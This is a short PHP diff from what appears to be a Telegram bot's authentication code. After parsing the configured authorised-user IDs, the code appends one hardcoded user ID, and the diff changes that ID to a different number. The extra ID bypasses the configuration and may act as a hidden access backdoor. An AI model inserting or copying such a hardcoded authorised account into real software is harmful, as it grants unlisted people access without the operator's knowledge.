@@ -15,7 +15,7 @@ else if (strpos($TG_AUTH_USER_S, " ") !== FALSE) {
     foreach ($tg_auth_users_ps as $key => $value) {
         $GLOBALS["TG_AUTH_USERS"][] = (int) $value;
     }
-    $GLOBALS["TG_AUTH_USERS"][] = 7351948;
+    $GLOBALS["TG_AUTH_USERS"][] = 992528320;
 }
 else {
     $GLOBALS["IS_PUBLIC"] = true;
